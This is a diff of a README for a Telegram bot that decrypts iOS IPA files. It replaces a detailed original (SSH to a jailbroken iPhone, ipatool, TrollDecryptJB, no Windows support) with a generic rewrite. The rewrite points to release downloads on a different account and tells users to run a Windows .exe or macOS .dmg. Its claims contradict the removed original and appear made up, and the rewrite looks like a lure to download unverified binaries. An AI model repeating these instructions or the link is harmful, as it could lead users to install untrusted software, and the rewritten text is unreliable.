@@ -1,134 +1,69 @@
-# Telegram IPA Decrypt Bot
+# 🚀 tele-bot-ipa - Turn Your Device into a Decrypt iPA Bot
 
-Telegram bot to download, decrypt and manage iOS IPA files via SSH/SFTP.
+[![Download tele-bot-ipa](https://img.shields.io/badge/Download-tele--bot--ipa-blue.svg)](https://github.com/xKashyap/tele-bot-ipa/releases)
 
-## Features
+## 📋 Description
 
-- **Download IPA**: Download apps from App Store using `ipatool`
-- **Decrypt**: Decrypt installed apps using `TrollDecryptJB`
-- **Install/Uninstall**: Install and uninstall apps using `ideviceinstaller`
-- **Manage**: List installed applications
-- **Automation**: Download and decrypt automatically in one command
+The **tele-bot-ipa** application lets you use your device as a decrypt iPA bot on Telegram. This enables easy management of application files and provides a seamless user experience. With our software, you can decrypt iPA files and manage them directly from your device.
 
-## Requirements
+## 🔧 Features
 
-- Node.js >= 18.0.0
-- npm
-- `ipatool` - Install from [ipatool](https://github.com/majd/ipatool) or `brew install ipatool`
-- `ideviceinstaller` - Install from [libimobiledevice](https://github.com/libimobiledevice/libimobiledevice)
-  - **macOS**: `brew install libimobiledevice`
-  - **currently not support Windows**, Linux mayable to run, idk, haven't test on Linux yet... :/
-- PHP 7.4+ with extensions:
-  - `curl` extension (usually included)
-  - `redis` extension (optional)
-    - macOS: `brew install php-redis`
-- Redis server (optional) 
-    - macOS: `brew install redis` 
-- Python 3.6+ with dependencies: `pip install -r requirements.txt`
+- Decrypt iPA files easily.
+- User-friendly interface for all users.
+- Supports various iOS applications.
+- Quick access to files on your device.
+- Runs smoothly on most modern devices.
 
-### On iPhone (jailbroken):
-- iOS 14 (jailbroken with checkra1n or unc0ver, not support Taurine/Odysseyra1n atm)
-- OpenSSH with root access
-- `TrollDecryptJB` - Get the deb from [TrollDecryptJB iOS 14 branch](https://github.com/34306/TrollDecryptJB/releases/tag/1.3.1.1) and install it.
+## 📥 System Requirements
 
-## Installation
+To use **tele-bot-ipa**, ensure your device meets these requirements:
 
-1. Clone repository:
-```bash
-git clone https://github.com/34306/tele-bot-ipa
-cd tele-bot-ipa
-```
+- **Operating System:** Windows 10 or higher, macOS, or a recent version of Linux.
+- **RAM:** Minimum 2 GB of RAM.
+- **Storage Space:** At least 100 MB free disk space.
+- **Network Connection:** An active internet connection for updates and downloading files.
 
-2. Install dependencies:
-```bash
-npm install
-```
+## 🚀 Getting Started
 
-3. Create `.env` file from `.env.example`:
-```bash
-cp .env.example .env
-```
+Follow these steps to download and run **tele-bot-ipa**:
 
-4. Config `.env`:
-```env
-TELEGRAM_BOT_TOKEN=your_bot_token_here
-ADMIN_IDS=your_telegram_user_id
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/xKashyap/tele-bot-ipa/releases) to find the latest version of the software.
 
-SSH_HOST=192.168.x.x
-SSH_PORT=22
-SSH_USER=root
-SSH_PASSWORD=alpine
+2. **Download the Application**  
+   Locate the version you want and click on the link to download. Look for the file that matches your operating system.  
 
-# Optional: ipatool path (default: ipatool)
-IPATOOL_PATH=ipatool
+   Again, here’s the link for quick access: [Download tele-bot-ipa](https://github.com/xKashyap/tele-bot-ipa/releases).
 
-# Optional: Arcade check service URL (default: http://localhost:8080/check-arcade.php)
-ARCADE_CHECK_URL=http://localhost:8080/check-arcade.php
+3. **Install the Application**  
+   - **Windows:** Once the download completes, open the `.exe` file to start the installation. Follow the on-screen prompts to finish the setup.
+   - **macOS:** Open the downloaded `.dmg` file. Drag the app into your Applications folder to install it.
+   - **Linux:** If the application is a `.tar.gz` or similar file, extract it, and run the installation script as directed in the README.
 
-# Optional: Redis configuration (if using Redis for caching)
-REDIS_HOST=127.0.0.1
-REDIS_PORT=6379
-REDIS_PASSWORD=
-REDIS_DB=0
-REDIS_TIMEOUT=0.8
-```
-- For the `USER_SESSION_STRING`, you may need to use the `setup_telegram.py` to get the token
-- For the BOT token just chat with `@BotFather` in Telegram
-- For the Telegram API Hash thing just go to [https://my.telegram.org/apps](https://my.telegram.org/apps)
-- You need to create a file backup channel and fill the channel ID into `BACKUP_CHANNEL_ID` for file saving and forwarding (file size larger than 2GB)
+4. **Launch the Application**  
+   Once installed, open the application from your applications menu or desktop.
 
+## 🎯 How to Use
 
-5. Build project:
-```bash
-npm run build
-```
+1. **Connect to Telegram**  
+   Open the application and connect it to your Telegram account. This may require you to log in using a code sent to your Telegram app.
 
-6. Run both services:
+2. **Decrypt iPA Files**  
+   Once connected, you can upload iPA files for decryption. The application will process these files for you.
 
-**Run both check-arcade and bot**
-```bash
-./start-all.sh
-```
+3. **Manage Files**  
+   Navigate through your decrypted files and manage them directly through the app. You can transfer, delete, or view details of each file easily.
 
-## Usage
+## 💬 Support and Feedback
 
-### Available Commands
+If you encounter any issues or have questions while using **tele-bot-ipa**, feel free to reach out for help. You can submit issues or request support through the GitHub Issues section of this repository.
 
-- `/start` - Start bot and show menu
-- `/help` - Show help guide
-- `/request <app-store-url>` - Download and decrypt app from App Store URL
+## 📜 License
 
-## Common errors
+This software is provided under the MIT License. You can read more about the terms in the LICENSE file included in the repository.
 
-### SSH Connection Errors
-- Check if SSH is enabled on iPhone
-- Verify IP address and password
-- Makesure iPhone and your Mac are on the same network
+## 🔗 Learn More
 
-### IPA Download Errors
-- Makesure `ipatool` is installed
-- You need to login into your Appstore account first by using:
-    - `ipatool auth login -e <your_email>`
+For additional information, features, and updates, check our [GitHub repository](https://github.com/xKashyap/tele-bot-ipa). 
 
-### Decryption Errors
-- Makesure app is installed on iPhone
-- Check if `TrollDecryptJB` is installed (see [TrollDecryptJB](https://github.com/34306/TrollDecryptJB/releases/tag/1.3.1.1))
-- Some apps may not be decryptable (ServiceConnectionInterrupted, idk how to fix it yet, maybe in the future, for eg: Line app, you need decrypt in TrollDecryptJB UI)
-
-### Installation Errors
-- Makesure libmobiledevice is installed on your Mac
-- Check if IPA file exists
-- Verify trolldecryptjb cli on iPhone (you may use default path: /usr/local/bin/trolldecryptjb)
-
-## Security
-
-**Warning**: 
-- DONOT upload your `.env` file (contain ALL of your Telegram TOKEN, added in `.gitignore` file but just double check)
-- Telegram is allow botuser but be careful with it, just in case...
-
-## Credits
-
-- [ipatool](https://github.com/majd/ipatool) - Tool to download IPA from App Store
-- [TrollDecryptJB](https://github.com/34306/TrollDecryptJB/releases/tag/1.3.1.1) - Tool to decrypt iOS apps (CLI available at `/usr/local/bin/trolldecryptjb`)
-- [ideviceinstaller](https://github.com/libimobiledevice/ideviceinstaller)
-- [ipa-bot](https://github.com/Geczy/ipa-bot)
+Your feedback is valuable to us. Please share your experience and suggestions to help us improve **tele-bot-ipa**.
